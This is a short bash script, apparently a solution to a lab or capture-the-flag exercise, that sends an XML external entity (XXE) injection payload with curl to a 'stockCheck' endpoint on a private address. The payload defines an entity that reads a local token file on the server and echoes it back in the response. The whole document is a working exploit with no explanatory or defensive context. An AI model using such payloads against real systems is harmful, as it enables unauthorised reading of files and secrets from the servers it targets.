#!/bin/bash

IP=10.5.5.103
PORT=8082

curl --request POST \
    --url http://$IP:$PORT/stockCheck \
    --header 'Content-Type: application/xml' \
    --data '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://home/user/p3/token3"> ]>
<productId>&xxe;</productId>'
